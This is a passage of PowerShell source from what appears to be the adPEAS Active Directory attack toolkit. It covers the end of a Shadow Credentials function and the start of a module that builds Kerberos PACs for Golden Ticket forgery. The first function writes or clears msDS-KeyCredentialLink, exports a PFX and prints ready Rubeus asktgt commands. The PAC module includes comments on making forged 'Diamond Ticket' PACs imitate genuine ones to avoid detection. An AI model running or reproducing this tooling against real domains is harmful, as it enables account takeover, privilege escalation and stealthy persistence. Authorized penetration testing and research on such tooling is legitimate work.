                $PFXBytes = $Cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
            }

            # Determine output path
            $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $PFXPath = "${TargetSAMAccountName}_$Timestamp.pfx"

            # Save PFX file using central Export-adPEASFile helper
            $exportResult = Export-adPEASFile -Path $PFXPath -Content $PFXBytes -Type Binary -SanitizeFilename -Force
            if (-not $exportResult.Success) {
                Write-Error "$FunctionPrefix Failed to save PFX: $($exportResult.Message)"
                return $null
            }
            $PFXPath = $exportResult.Path

            if ($Cert) { $Cert.Dispose() }

            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "AddShadowCredential"
                    $TargetType = $TargetSAMAccountName
                    DistinguishedName = $TargetDN
                    DeviceID = $DeviceGUID.ToString()
                    KeyID = [Convert]::ToBase64String($KeyHash)
                    PFXPath = $PFXPath
                    PFXPassword = if ($CertPassword) { $CertPassword } else { $null }
                    Success = $true
                    Message = "Shadow Credential successfully added. Certificate saved as PFX."
                }
            } else {
                Show-Line "Successfully added Shadow Credential to: $TargetSAMAccountName" -Class Hint
                Show-KeyValue "Device ID:" $DeviceGUID
                Show-KeyValue "Key ID:" $([Convert]::ToBase64String($KeyHash))
                Show-KeyValue "PFX Path:" $PFXPath
                if ($CertPassword) {
                    Show-KeyValue "PFX Password:" $CertPassword
                } else {
                    Show-KeyValue "PFX Password:" "(none)" -Class Note
                }
                Show-EmptyLine
                Show-Line "Usage with Rubeus:" -Class Note
                if ($CertPassword) {
                    Show-Line "Rubeus.exe asktgt /user:$TargetSAMAccountName /certificate:$PFXPath /password:`"$CertPassword`" /domain:$($Script:LDAPContext.Domain) /dc:$($Script:LDAPContext.Server) /getcredentials /show"
                } else {
                    Show-Line "Rubeus.exe asktgt /user:$TargetSAMAccountName /certificate:$PFXPath /domain:$($Script:LDAPContext.Domain) /dc:$($Script:LDAPContext.Server) /getcredentials /show"
                }
                Show-EmptyLine
                Show-Line "Usage with adPEAS Connect-adPEAS:" -Class Note
                if ($CertPassword) {
                    Show-Line "Connect-adPEAS -Domain $($Script:LDAPContext.Domain) -Certificate `'$PFXPath`' -CertificatePassword `'$CertPassword`'"
                } else {
                    Show-Line "Connect-adPEAS -Domain $($Script:LDAPContext.Domain) -Certificate `'$PFXPath`'"
                }
            }
        } catch {
            # Decode the LDAP write failure (LDAP ResultCode + AD server sub-error) so a
            # rejected msDS-KeyCredentialLink write on a hardened target names the cause.
            $writeError = Resolve-LDAPWriteError -Exception $_.Exception -Operation "add Shadow Credential to '$TargetSAMAccountName'"
            throw ("Failed to add Shadow Credential to '$TargetSAMAccountName'." + [Environment]::NewLine + '  ' + $writeError.Formatted)
        } finally {
            # Ensure RSA key is disposed even on error
            if ($RSA) { $RSA.Dispose() }
        }
    }
    else {
        # ===== ClearShadowCredentials Operation =====
        Write-Log "$FunctionPrefix Clearing Shadow Credentials from: $TargetSAMAccountName"

        try {
            # Read existing msDS-KeyCredentialLink values via Invoke-LDAPSearch.
            # Escape the target DN for the filter ('(' ')' '\,' would otherwise break it).
            $escapedTargetDN = Escape-LDAPFilterDN -DistinguishedName $TargetDN
            $SearchResult = Invoke-LDAPSearch -Filter "(distinguishedName=$escapedTargetDN)" -Properties @('msDS-KeyCredentialLink') -SizeLimit 1
            $ExistingCredentials = @()
            if ($SearchResult -and $SearchResult.'msDS-KeyCredentialLink') {
                $RawValues = $SearchResult.'msDS-KeyCredentialLink'
                if ($RawValues -is [string]) {
                    $ExistingCredentials = @($RawValues)
                } else {
                    foreach ($val in $RawValues) {
                        $ExistingCredentials += $val.ToString()
                    }
                }
            }

            $CredentialCount = $ExistingCredentials.Count
            Write-Log "$FunctionPrefix Found $CredentialCount Shadow Credential(s)"

            if ($CredentialCount -eq 0) {
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        Success = $true
                        Message = "No Shadow Credentials to clear"
                    }
                } else {
                    Show-Line "No Shadow Credentials found on: $TargetSAMAccountName" -Class Note
                }
                return $null
            }

            # Parse all existing KeyCredentialLink entries
            $ParsedCredentials = @()
            foreach ($CredString in $ExistingCredentials) {
                # Parse DN-Binary format: B:<hexlength>:<hex>:<dn>
                if ($CredString -match '^B:(\d+):([0-9A-Fa-f]+):(.+)$') {
                    $HexData = $Matches[2]

                    # Convert hex to bytes
                    $KeyCredBytes = [byte[]]::new($HexData.Length / 2)
                    for ($i = 0; $i -lt $HexData.Length; $i += 2) {
                        $KeyCredBytes[$i / 2] = [Convert]::ToByte($HexData.Substring($i, 2), 16)
                    }

                    $ParsedCred = @{
                        RawString = $CredString
                        DeviceID = $null
                        KeyID = $null
                        CreationTime = $null
                    }

                    # Parse LTV entries starting at offset 4
                    $offset = 4
                    while ($offset + 3 -le $KeyCredBytes.Length) {
                        $EntryLength = [BitConverter]::ToUInt16($KeyCredBytes, $offset)
                        $offset += 2
                        $EntryType = $KeyCredBytes[$offset]
                        $offset += 1

                        if ($offset + $EntryLength -gt $KeyCredBytes.Length) { break }

                        $EntryData = if ($EntryLength -gt 0) { [byte[]]$KeyCredBytes[$offset..($offset + $EntryLength - 1)] } else { @() }

                        switch ($EntryType) {
                            0x01 { $ParsedCred.KeyID = [Convert]::ToBase64String($EntryData) }
                            0x06 {
                                if ($EntryData.Length -eq 16) {
                                    $ParsedCred.DeviceID = (New-Object GUID(,[byte[]]$EntryData)).ToString()
                                }
                            }
                            0x09 {
                                if ($EntryData.Length -eq 8) {
                                    $FileTime = [BitConverter]::ToInt64($EntryData, 0)
                                    if ($FileTime -gt 0) {
                                        $ParsedCred.CreationTime = [DateTime]::FromFileTimeUtc($FileTime)
                                    }
                                }
                            }
                        }

                        $offset += $EntryLength
                    }

                    $ParsedCredentials += [PSCustomObject]$ParsedCred
                }
            }

            # Decision logic
            if ($DeviceID) {
                # Remove specific DeviceID
                $NormalizedInputGUID = $null
                $CleanInput = $DeviceID.Trim().ToLower()

                if ($CleanInput -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
                    $NormalizedInputGUID = $CleanInput
                }
                elseif ($CleanInput -match '^[0-9a-f]{32}$') {
                    $rawBytes = [byte[]]::new(16)
                    for ($i = 0; $i -lt 32; $i += 2) {
                        $rawBytes[$i / 2] = [Convert]::ToByte($CleanInput.Substring($i, 2), 16)
                    }
                    $NormalizedInputGUID = (New-Object GUID(,[byte[]]$rawBytes)).ToString().ToLower()
                    Write-Log "$FunctionPrefix Converted raw hex to GUID '$NormalizedInputGUID'"
                }
                else {
                    $NormalizedInputGUID = $CleanInput.Replace('-', '')
                }

                # Find the credential to remove (need both ParsedCred and index for RawString)
                $CredToRemoveIndex = -1
                for ($idx = 0; $idx -lt $ParsedCredentials.Count; $idx++) {
                    $pc = $ParsedCredentials[$idx]
                    if (-not $pc.DeviceID) { continue }
                    $StoredGUID = $pc.DeviceID.ToLower()
                    if (($StoredGUID -eq $NormalizedInputGUID) -or
                        ($StoredGUID.Replace('-', '') -eq $NormalizedInputGUID.Replace('-', ''))) {
                        $CredToRemoveIndex = $idx
                        break
                    }
                }

                if ($CredToRemoveIndex -eq -1) {
                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Operation = "ClearShadowCredentials"
                            $TargetType = $TargetSAMAccountName
                            DistinguishedName = $TargetDN
                            Success = $false
                            Message = "DeviceID '$DeviceID' not found"
                            ExistingCredentials = $ParsedCredentials
                        }
                    } else {
                        Write-Warning "[!] No Shadow Credential with DeviceID '$DeviceID' found on: $TargetSAMAccountName"
                        Show-EmptyLine
                        Show-Line "Existing Shadow Credentials:" -Class Hint

                        foreach ($cred in $ParsedCredentials) {
                            Show-KeyValue "DeviceID:" $cred.DeviceID
                            Show-KeyValue "KeyID:" $cred.KeyID
                            if ($cred.CreationTime) {
                                Show-KeyValue "Created:" "$($cred.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
                            }
                            Show-EmptyLine
                        }
                    }
                    return $null
                }

                # Remove specific credential via ModifyRequest Delete (remove single value)
                $ValueToRemove = $ParsedCredentials[$CredToRemoveIndex].RawString
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-KeyCredentialLink"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                $Modification.Add($ValueToRemove) | Out-Null

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        RemovedDeviceID = $DeviceID
                        RemainingCount = $CredentialCount - 1
                        Success = $true
                        Message = "Shadow Credential with DeviceID '$DeviceID' removed"
                    }
                } else {
                    Show-Line "Successfully removed Shadow Credential with DeviceID '$DeviceID' from: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($CredentialCount -eq 1) {
                # Clear single credential via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-KeyCredentialLink"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = 1
                        Success = $true
                        Message = "Shadow Credential successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared Shadow Credential from: $TargetSAMAccountName" -Class Hint
                }

            } elseif ($Force) {
                # Clear all credentials via ModifyRequest
                $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                $ModifyRequest.DistinguishedName = $TargetDN

                $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                $Modification.Name = "msDS-KeyCredentialLink"
                $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                $ModifyRequest.Modifications.Add($Modification) | Out-Null

                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                }

                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        ClearedCount = $CredentialCount
                        Success = $true
                        Message = "All $CredentialCount Shadow Credentials successfully cleared"
                    }
                } else {
                    Show-Line "Successfully cleared all $CredentialCount Shadow Credentials from: $TargetSAMAccountName" -Class Hint
                }

            } else {
                # Multiple entries, no Force, no specific DeviceID
                if ($PassThru) {
                    return [PSCustomObject]@{
                        Operation = "ClearShadowCredentials"
                        $TargetType = $TargetSAMAccountName
                        DistinguishedName = $TargetDN
                        CredentialCount = $CredentialCount
                        ExistingCredentials = $ParsedCredentials
                        Success = $false
                        Message = "Multiple credentials found. Use -DeviceID <GUID> or -Force to proceed."
                    }
                } else {
                    Write-Warning "[!] Multiple Shadow Credentials ($CredentialCount) found on: $TargetSAMAccountName"
                    Show-EmptyLine
                    Show-Line "To delete a specific credential, use: -DeviceID <GUID>" -Class Note
                    Show-Line "To delete ALL credentials, use: -Force" -Class Note
                    Show-EmptyLine
                    Show-Line "Existing Shadow Credentials:" -Class Hint

                    $index = 1
                    foreach ($cred in $ParsedCredentials) {
                        Show-KeyValue "[$index] DeviceID:" $cred.DeviceID
                        Show-KeyValue "    KeyID:" $cred.KeyID
                        if ($cred.CreationTime) {
                            Show-KeyValue "    Created:" "$($cred.CreationTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
                        }
                        Show-EmptyLine
                        $index++
                    }
                }
            }
        } catch {
            # Decode the LDAP write failure (LDAP ResultCode + AD server sub-error).
            $writeError = Resolve-LDAPWriteError -Exception $_.Exception -Operation "clear Shadow Credentials on '$TargetSAMAccountName'"
            throw ("Failed to clear Shadow Credentials on '$TargetSAMAccountName'." + [Environment]::NewLine + '  ' + $writeError.Formatted)
        }
    }
}

# Helper function to add LTV entry to KeyCredentialLink
function Add-KeyCredentialLinkEntry {
    param(
        [byte]$EntryType,
        [byte[]]$Data,
        [System.Collections.ArrayList]$Target
    )
    # Length (2 bytes, little-endian) - length of Value field only
    [void]$Target.AddRange([BitConverter]::GetBytes([UInt16]$Data.Length))
    # EntryType (1 byte)
    [void]$Target.Add($EntryType)
    # Value (n bytes)
    [void]$Target.AddRange($Data)
}



# ----- Kerberos-PAC.ps1 -----

<#
.SYNOPSIS
    PAC (Privilege Attribute Certificate) structure builder for Kerberos Golden Tickets.

.DESCRIPTION
    This module provides functions to construct PAC structures required for Golden Ticket creation.
    The PAC is embedded in Kerberos tickets and contains authorization data including:
    - User SID and group memberships
    - Logon information (account name, domain, etc.)
    - PAC signatures (server and KDC checksums)

    Structures implemented (per MS-PAC specification):
    - KERB_VALIDATION_INFO: User account information and group memberships
    - PAC_INFO_BUFFER: PAC buffer descriptor
    - PAC_SIGNATURE_DATA: PAC checksums
    - PAC_CLIENT_INFO: Client name and time
    - PACTYPE: Overall PAC structure

.NOTES
    Author: Alexander Sturz (@_61106960_)

    References:
    - [MS-PAC]: Privilege Attribute Certificate Data Structure
    - [MS-KILE]: Kerberos Protocol Extensions
    - [MS-RPCE]: Remote Procedure Call Protocol Extensions

    Security Note:
    This module is intended for authorized security testing and research only.
    Golden Ticket creation requires the krbtgt key which is only available through:
    - Legitimate administrative access
    - Prior security testing (with proper authorization)
#>

# ============================================================================
# PAC Constants (MS-PAC Section 2.4)
# ============================================================================

# PAC_INFO_BUFFER ulType values
$Script:PAC_LOGON_INFO = 1                    # KERB_VALIDATION_INFO
$Script:PAC_CREDENTIALS_INFO = 2              # PAC_CREDENTIAL_INFO (NTLM supplemental credentials)
$Script:PAC_SERVER_CHECKSUM = 6               # PAC_SIGNATURE_DATA (server)
$Script:PAC_PRIVSVR_CHECKSUM = 7              # PAC_SIGNATURE_DATA (KDC)
$Script:PAC_CLIENT_INFO_TYPE = 10             # PAC_CLIENT_INFO
$Script:PAC_DELEGATION_INFO = 11              # S4U_DELEGATION_INFO
$Script:PAC_UPN_DNS_INFO = 12                 # UPN_DNS_INFO
$Script:PAC_CLIENT_CLAIMS_INFO = 13           # PAC_CLIENT_CLAIMS_INFO
$Script:PAC_DEVICE_INFO = 14                  # PAC_DEVICE_INFO
$Script:PAC_DEVICE_CLAIMS_INFO = 15           # PAC_DEVICE_CLAIMS_INFO
$Script:PAC_TICKET_CHECKSUM = 16              # PAC_SIGNATURE_DATA (ticket)
$Script:PAC_ATTRIBUTES_INFO = 17              # PAC_ATTRIBUTES_INFO
$Script:PAC_REQUESTOR = 18                    # PAC_REQUESTOR
$Script:PAC_FULL_CHECKSUM = 19                # PAC_SIGNATURE_DATA (full PAC)

# Signature algorithm types
$Script:KERB_CHECKSUM_HMAC_MD5 = -138         # 0xFFFFFF76 (RC4-HMAC)
$Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 = 15
$Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 = 16

# User Account Control flags (MS-SAMR 2.2.1.13)
$Script:USER_ACCOUNT_DISABLED = 0x00000001
$Script:USER_HOME_DIRECTORY_REQUIRED = 0x00000002
$Script:USER_PASSWORD_NOT_REQUIRED = 0x00000004
$Script:USER_TEMP_DUPLICATE_ACCOUNT = 0x00000008
$Script:USER_NORMAL_ACCOUNT = 0x00000010
$Script:USER_MNS_LOGON_ACCOUNT = 0x00000020
$Script:USER_INTERDOMAIN_TRUST_ACCOUNT = 0x00000040
$Script:USER_WORKSTATION_TRUST_ACCOUNT = 0x00000080
$Script:USER_SERVER_TRUST_ACCOUNT = 0x00000100
$Script:USER_DONT_EXPIRE_PASSWORD = 0x00000200
$Script:USER_ACCOUNT_AUTO_LOCKED = 0x00000400
$Script:USER_ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x00000800
$Script:USER_SMARTCARD_REQUIRED = 0x00001000
$Script:USER_TRUSTED_FOR_DELEGATION = 0x00002000
$Script:USER_NOT_DELEGATED = 0x00004000
$Script:USER_USE_DES_KEY_ONLY = 0x00008000
$Script:USER_DONT_REQUIRE_PREAUTH = 0x00010000
$Script:USER_PASSWORD_EXPIRED = 0x00020000
$Script:USER_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x00040000
$Script:USER_NO_AUTH_DATA_REQUIRED = 0x00080000
$Script:USER_PARTIAL_SECRETS_ACCOUNT = 0x00100000

# Group attributes (MS-PAC 2.2.1.4)
$Script:SE_GROUP_MANDATORY = 0x00000001
$Script:SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
$Script:SE_GROUP_ENABLED = 0x00000004
$Script:SE_GROUP_OWNER = 0x00000008
$Script:SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010
$Script:SE_GROUP_RESOURCE = 0x20000000
$Script:SE_GROUP_LOGON_ID = 0xC0000000

# Default group attributes for standard group membership
$Script:DEFAULT_GROUP_ATTRIBUTES = $Script:SE_GROUP_MANDATORY -bor $Script:SE_GROUP_ENABLED_BY_DEFAULT -bor $Script:SE_GROUP_ENABLED

# Well-known RIDs
$Script:DOMAIN_GROUP_RID_USERS = 513
$Script:DOMAIN_GROUP_RID_ADMINS = 512
$Script:DOMAIN_GROUP_RID_COMPUTERS = 515
$Script:DOMAIN_GROUP_RID_CONTROLLERS = 516
$Script:DOMAIN_GROUP_RID_ENTERPRISE_ADMINS = 519
$Script:DOMAIN_GROUP_RID_SCHEMA_ADMINS = 518

# ============================================================================
# Helper Functions for Binary Encoding
# ============================================================================

function ConvertTo-FlatByteArray {
    <#
    .SYNOPSIS
        Recursively flattens a nested array structure into a single byte array.
    .DESCRIPTION
        PowerShell's += operator on arrays creates Object[] instead of byte[].
        This function properly flattens nested arrays into a single byte[].
    #>
    [CmdletBinding()]
    param($InputArray)

    $result = [System.Collections.Generic.List[byte]]::new()

    foreach ($item in $InputArray) {
        if ($null -eq $item) { continue }

        if ($item -is [byte]) {
            $result.Add($item)
        }
        elseif ($item -is [array]) {
            # Recursively flatten nested arrays
            $flattened = ConvertTo-FlatByteArray -InputArray $item
            if ($flattened -and $flattened.Count -gt 0) {
                $result.AddRange([byte[]]$flattened)
            }
        }
        else {
            # Try to cast to byte
            $result.Add([byte]$item)
        }
    }

    return [byte[]]$result.ToArray()
}

function Write-UInt16LE {
    <#
    .SYNOPSIS
        Writes a 16-bit unsigned integer in little-endian format.
    #>
    [CmdletBinding()]
    param([uint16]$Value)

    return [byte[]]@(
        ($Value -band 0xFF),
        (($Value -shr 8) -band 0xFF)
    )
}

function Write-UInt32LE {
    <#
    .SYNOPSIS
        Writes a 32-bit unsigned integer in little-endian format.
    #>
    [CmdletBinding()]
    param([uint32]$Value)

    return [byte[]]@(
        ($Value -band 0xFF),
        (($Value -shr 8) -band 0xFF),
        (($Value -shr 16) -band 0xFF),
        (($Value -shr 24) -band 0xFF)
    )
}

function Write-Int32LE {
    <#
    .SYNOPSIS
        Writes a 32-bit signed integer in little-endian format.
    #>
    [CmdletBinding()]
    param([int32]$Value)

    $bytes = [BitConverter]::GetBytes($Value)
    if (-not [BitConverter]::IsLittleEndian) {
        [Array]::Reverse($bytes)
    }
    return [byte[]]$bytes
}

function Write-UInt64LE {
    <#
    .SYNOPSIS
        Writes a 64-bit unsigned integer in little-endian format.
    #>
    [CmdletBinding()]
    param([uint64]$Value)

    $bytes = [BitConverter]::GetBytes($Value)
    if (-not [BitConverter]::IsLittleEndian) {
        [Array]::Reverse($bytes)
    }
    return [byte[]]$bytes
}

function Write-Int64LE {
    <#
    .SYNOPSIS
        Writes a 64-bit signed integer in little-endian format.
    #>
    [CmdletBinding()]
    param([int64]$Value)

    $bytes = [BitConverter]::GetBytes($Value)
    if (-not [BitConverter]::IsLittleEndian) {
        [Array]::Reverse($bytes)
    }
    return [byte[]]$bytes
}

function ConvertTo-FileTime {
    <#
    .SYNOPSIS
        Converts a DateTime to Windows FILETIME format.
    #>
    [CmdletBinding()]
    param([datetime]$DateTime)

    return $DateTime.ToFileTimeUtc()
}

function Write-UnicodeStringRPC {
    <#
    .SYNOPSIS
        Writes a RPC_UNICODE_STRING structure (MS-RPCE 2.3.10).
    .DESCRIPTION
        RPC_UNICODE_STRING:
        - Length (2 bytes): Length of string in bytes (not including null)
        - MaximumLength (2 bytes): Maximum length in bytes (Length + 2 for null terminator like Rubeus)
        - Buffer (4 bytes): Pointer to string data (NDR unique pointer)

        Rubeus always allocates a pointer for strings, even empty ones.
        For empty strings: Length=0, MaxLen=0, but Pointer is still valid.
    #>
    [CmdletBinding()]
    param(
        [string]$Value,
        [uint32]$PointerId
    )

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Value)
    $length = [uint16]$bytes.Length

    # For empty strings, still use the pointer (Rubeus behavior)
    # Length=0, MaxLen=0, but pointer is valid
    if ($length -eq 0) {
        $result = @()
        $result += Write-UInt16LE -Value 0        # Length = 0
        $result += Write-UInt16LE -Value 0        # MaximumLength = 0
        $result += Write-UInt32LE -Value $PointerId  # Valid pointer (Rubeus uses this)
        return ConvertTo-FlatByteArray $result
    }

    # MaximumLength = Length + 2 (for null terminator) like Rubeus
    $maxLength = [uint16]($bytes.Length + 2)

    $result = @()
    $result += Write-UInt16LE -Value $length
    $result += Write-UInt16LE -Value $maxLength
    $result += Write-UInt32LE -Value $PointerId  # Unique pointer

    return ConvertTo-FlatByteArray $result
}

function Write-UnicodeStringData {
    <#
    .SYNOPSIS
        Writes the actual Unicode string data for NDR marshaling.
    .DESCRIPTION
        NDR conformant varying array for string:
        - MaximumCount (4 bytes): Maximum elements
        - Offset (4 bytes): Offset to first element
        - ActualCount (4 bytes): Actual number of elements
        - Data: Unicode characters (2 bytes each)
        - Padding to 4-byte boundary
    #>
    [CmdletBinding()]
    param([string]$Value)

    $result = @()
    $charCount = $Value.Length

    # NDR conformant varying array header
    # For empty strings: MaximumCount = 0 (like Rubeus)
    # For non-empty strings: MaximumCount = charCount + 1 (include null terminator like Rubeus)
    if ($charCount -eq 0) {
        $maxCount = 0
    } else {
        $maxCount = $charCount + 1
    }
    $result += Write-UInt32LE -Value $maxCount  # MaximumCount
    $result += Write-UInt32LE -Value 0          # Offset
    $result += Write-UInt32LE -Value $charCount # ActualCount (actual chars, no null)

    # Unicode string data
    $result += [System.Text.Encoding]::Unicode.GetBytes($Value)

    # Pad to 4-byte boundary
    $totalLen = 12 + ($charCount * 2)
    $padding = (4 - ($totalLen % 4)) % 4
    if ($padding -gt 0) {
        $result += [byte[]]::new($padding)
    }

    return ConvertTo-FlatByteArray $result
}

function ConvertFrom-SIDString {
    <#
    .SYNOPSIS
        Converts a SID string (S-1-5-21-xxx-xxx-xxx-xxx) to binary format.
    #>
    [CmdletBinding()]
    param([string]$SIDString)

    try {
        $sid = New-Object System.Security.Principal.SecurityIdentifier($SIDString)
        $bytes = [byte[]]::new($sid.BinaryLength)
        $sid.GetBinaryForm($bytes, 0)
        return $bytes
    }
    catch {
        Write-Log "[ConvertFrom-SIDString] Failed to parse SID: $SIDString - $_" -Level Error
        return $null
    }
}

function Get-DomainSIDFromUserSID {
    <#
    .SYNOPSIS
        Extracts the domain SID from a user/group SID.
    .DESCRIPTION
        User SID: S-1-5-21-xxx-xxx-xxx-1234
        Domain SID: S-1-5-21-xxx-xxx-xxx
    #>
    [CmdletBinding()]
    param([string]$UserSID)

    $parts = $UserSID -split '-'
    if ($parts.Count -ge 5) {
        # Remove the last component (RID)
        return ($parts[0..($parts.Count - 2)]) -join '-'
    }
    return $UserSID
}

function Write-SIDNDR {
    <#
    .SYNOPSIS
        Writes a SID in NDR format for RPC marshaling.
    .DESCRIPTION
        NDR SID structure:
        - Revision (1 byte)
        - SubAuthorityCount (1 byte)
        - IdentifierAuthority (6 bytes)
        - SubAuthority array (4 bytes each)
    #>
    [CmdletBinding()]
    param([string]$SIDString)

    $sidBytes = ConvertFrom-SIDString -SIDString $SIDString
    if (-not $sidBytes) {
        return [byte[]]@()
    }

    # NDR pointer to SID (conformant array)
    $subAuthCount = $sidBytes[1]
    $result = @()

    # MaximumCount for conformant array
    $result += Write-UInt32LE -Value $subAuthCount

    # SID binary data
    $result += $sidBytes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# GROUP_MEMBERSHIP Structure (MS-PAC 2.2.2)
# ============================================================================

function New-GroupMembership {
    <#
    .SYNOPSIS
        Creates a GROUP_MEMBERSHIP structure.
    .DESCRIPTION
        GROUP_MEMBERSHIP:
        - RelativeId (4 bytes): RID of the group
        - Attributes (4 bytes): Group attributes (SE_GROUP_*)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [uint32]$RelativeId,

        [Parameter(Mandatory=$false)]
        [uint32]$Attributes = $Script:DEFAULT_GROUP_ATTRIBUTES
    )

    $result = @()
    $result += Write-UInt32LE -Value $RelativeId
    $result += Write-UInt32LE -Value $Attributes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# KERB_SID_AND_ATTRIBUTES Structure (MS-PAC 2.2.1)
# ============================================================================

function New-SidAndAttributes {
    <#
    .SYNOPSIS
        Creates a KERB_SID_AND_ATTRIBUTES structure for extra SIDs.
    .DESCRIPTION
        KERB_SID_AND_ATTRIBUTES:
        - Sid (pointer): PISID - pointer to SID
        - Attributes (4 bytes): Group attributes
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SID,

        [Parameter(Mandatory=$false)]
        [uint32]$Attributes = $Script:DEFAULT_GROUP_ATTRIBUTES,

        [Parameter(Mandatory=$true)]
        [uint32]$PointerId
    )

    $result = @()
    $result += Write-UInt32LE -Value $PointerId    # Pointer to SID
    $result += Write-UInt32LE -Value $Attributes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# KERB_VALIDATION_INFO Structure (MS-PAC 2.5)
# ============================================================================

function Build-KerbValidationInfo {
    <#
    .SYNOPSIS
        Builds a KERB_VALIDATION_INFO structure for PAC.

    .DESCRIPTION
        Creates the primary authorization data structure containing:
        - User logon information (name, domain, SID, etc.)
        - Group memberships (primary group and additional groups)
        - Logon times and session information
        - User account control flags

        This structure is the core of the PAC and determines the user's
        effective permissions in the domain.

    .PARAMETER UserName
        The sAMAccountName of the user.

    .PARAMETER Domain
        The NetBIOS domain name (e.g., "CONTOSO").

    .PARAMETER DomainSID
        The domain SID string (e.g., "S-1-5-21-xxx-xxx-xxx").

    .PARAMETER UserRID
        The user's relative identifier (RID).

    .PARAMETER PrimaryGroupRID
        The user's primary group RID (default: 513 - Domain Users).

    .PARAMETER GroupRIDs
        Array of additional group RIDs the user belongs to.
        Default includes Domain Users (513).

    .PARAMETER ExtraSIDs
        Array of extra SIDs for cross-domain/universal group membership.
        These can include SIDs from other domains.

    .PARAMETER LogonTime
        The time of logon (default: current time).

    .PARAMETER LogoffTime
        The time of logoff (default: never - max FILETIME).

    .PARAMETER UserAccountControl
        UAC flags for the account (default: NORMAL_ACCOUNT).

    .EXAMPLE
        $validationInfo = Build-KerbValidationInfo -UserName "administrator" `
            -Domain "CONTOSO" -DomainSID "S-1-5-21-xxx-xxx-xxx" `
            -UserRID 500 -GroupRIDs @(512, 513, 518, 519, 520)

    .NOTES
        The NDR marshaling follows MS-RPCE conventions with proper pointer handling.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID,

        [Parameter(Mandatory=$false)]
        [uint32]$PrimaryGroupRID = $Script:DOMAIN_GROUP_RID_USERS,

        [Parameter(Mandatory=$false)]
        [uint32[]]$GroupRIDs = @($Script:DOMAIN_GROUP_RID_USERS),

        [Parameter(Mandatory=$false)]
        [string[]]$ExtraSIDs = @(),

        [Parameter(Mandatory=$false)]
        [datetime]$LogonTime,

        [Parameter(Mandatory=$false)]
        [datetime]$LogoffTime,

        [Parameter(Mandatory=$false)]
        [uint32]$UserAccountControl = $Script:USER_NORMAL_ACCOUNT,

        # Optional "recut" source: when supplied (Diamond Ticket), real per-user values
        # extracted from a genuine PAC override the synthetic defaults below, so the rebuilt
        # KERB_VALIDATION_INFO mirrors the legitimate ticket instead of leaving the well-known
        # blank/zeroed fields that betray a forged PAC. Recognized keys (all optional):
        #   FullName, LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive, LogonServer (string)
        #   LogonCount, BadPasswordCount (int)
        #   GroupAttributes (uint32[] parallel to GroupRIDs)
        #   LogoffTimeRaw, KickOffTimeRaw, PasswordLastSetRaw,
        #   PasswordCanChangeRaw, PasswordMustChangeRaw (raw int64 FILETIME)
        [Parameter(Mandatory=$false)]
        [hashtable]$SourceInfo
    )

